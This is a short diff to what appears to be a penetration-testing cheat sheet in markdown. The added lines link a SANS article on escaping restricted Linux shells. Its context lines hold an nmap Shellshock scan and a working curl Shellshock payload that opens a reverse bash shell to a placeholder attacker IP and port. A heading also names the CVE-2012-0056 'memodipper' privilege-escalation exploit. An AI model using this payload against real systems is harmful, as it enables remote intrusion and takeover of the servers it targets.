@@ -45,6 +45,12 @@ nmap <target ip> -p <target port> --script=http-shellshock --script-args uri=/cg
 curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1; echo zzzz;'" http://<target ip>/cgi-bin/home.cgi | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
 ```
 
+[Escaping Restricted Linux Shells](https://www.sans.org/blog/escaping-restricted-linux-shells/)
+
+```
+restricted: cannot specify `/' in command names
+```
+
 [CVE-2012-0056] memodipper
 
 ```
